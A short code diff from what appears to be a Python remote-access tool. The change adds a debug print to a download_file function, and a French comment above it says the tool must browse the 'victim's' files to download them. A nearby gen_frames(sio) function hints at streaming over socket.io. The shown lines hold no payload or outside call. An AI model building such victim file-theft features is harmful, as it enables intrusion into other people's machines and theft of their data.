@@ -128,6 +128,7 @@ def gen_frames(sio):
 
 #On dois pouvoir se balader dans les fichier de la victime pour télécharger un fichier donner
 def download_file(file_path):
+    print(file_path)
     try:
         # Ensure file_path is a string and correct path separators
         file_path = file_path.replace('/', '\\')
